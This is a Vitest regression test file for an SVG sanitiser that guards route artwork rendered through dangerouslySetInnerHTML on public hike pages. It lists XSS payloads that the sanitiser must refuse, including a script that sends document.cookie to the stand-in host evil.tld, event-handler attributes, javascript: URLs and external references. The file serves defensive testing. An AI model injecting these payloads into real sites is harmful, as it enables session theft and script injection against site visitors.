import { describe, it, expect } from 'vitest'
import { isSafeRouteArtwork } from '@/components/trails/RouteArtwork'
import { generateRouteArtwork } from '@/lib/gpx'

/**
 * Regression tests for L1 — trail.analytics.routeArtworkSvg is handed to
 * dangerouslySetInnerHTML on public /hikes pages, straight out of the
 * admin-writable vd_entities.value JSON, with nothing between the store and
 * the render enforcing what it is.
 */

const realArtwork = generateRouteArtwork([
  { lat: -29.0, lon: 29.2, ele: 1800, time: '' },
  { lat: -29.1, lon: 29.3, ele: 2100, time: '' },
  { lat: -29.2, lon: 29.25, ele: 2400, time: '' },
] as never)

describe('the artwork the app actually generates still renders', () => {
  it('accepts generateRouteArtwork output verbatim', () => {
    expect(realArtwork).toContain('<svg')
    expect(isSafeRouteArtwork(realArtwork)).toBe(true)
  })

  it('accepts the same artwork after the tone recolour', () => {
    expect(isSafeRouteArtwork(realArtwork.replaceAll('#2d6a4f', '#ffffff'))).toBe(true)
  })

  it('accepts the richer shapes an artwork revision might add', () => {
    expect(isSafeRouteArtwork(
      '<svg viewBox="0 0 300 160"><g><path d="M 0 0 L 10 10"/>' +
      '<circle cx="5" cy="5" r="2"/><polyline points="0,0 10,10"/></g></svg>',
    )).toBe(true)
  })
})

describe('anything that is not route artwork is refused', () => {
  it.each([
    ['a script element', '<svg><script>fetch("//evil.tld?c="+document.cookie)</script></svg>'],
    ['an event handler', '<svg><path d="M0 0" onload="alert(1)"/></svg>'],
    ['an onerror handler', '<svg><circle onerror="alert(1)" r="1"/></svg>'],
    ['a foreignObject', '<svg><foreignObject><body onload="alert(1)"/></foreignObject></svg>'],
    ['an anchor', '<svg><a href="https://evil.tld"><path d="M0 0"/></a></svg>'],
    ['an external image', '<svg><image href="https://evil.tld/track.png"/></svg>'],
    ['a use element pulling an external doc', '<svg><use xlink:href="https://evil.tld/x#y"/></svg>'],
    ['a javascript: url', '<svg><path d="M0 0" fill="url(javascript:alert(1))"/></svg>'],
    ['a data: url', '<svg><path style="background:data:text/html,<script>1</script>"/></svg>'],
    ['a CDATA section', '<svg><![CDATA[<script>alert(1)</script>]]></svg>'],
    ['an html comment hiding markup', '<svg><!-- <script>alert(1)</script> --></svg>'],
    ['an iframe', '<svg><iframe src="https://evil.tld"></iframe></svg>'],
    ['plain html instead of an svg', '<div onclick="alert(1)">not artwork</div>'],
    ['an img tag before the svg', '<img src=x onerror=alert(1)><svg></svg>'],
  ])('refuses %s', (_label, svg) => {
    expect(isSafeRouteArtwork(svg)).toBe(false)
  })

  it.each([
    ['an empty string', ''],
    ['whitespace', '   '],
    ['a bare string', 'no markup at all'],
  ])('refuses %s', (_label, svg) => {
    expect(isSafeRouteArtwork(svg)).toBe(false)
  })

  it('refuses a value large enough to be a denial of service on its own', () => {
    expect(isSafeRouteArtwork('<svg>' + '<path d="M0 0"/>'.repeat(50_000) + '</svg>')).toBe(false)
  })

  it.each([null, undefined, 42, {}, []])('refuses the non-string %j', value => {
    expect(isSafeRouteArtwork(value as unknown as string)).toBe(false)
  })
})
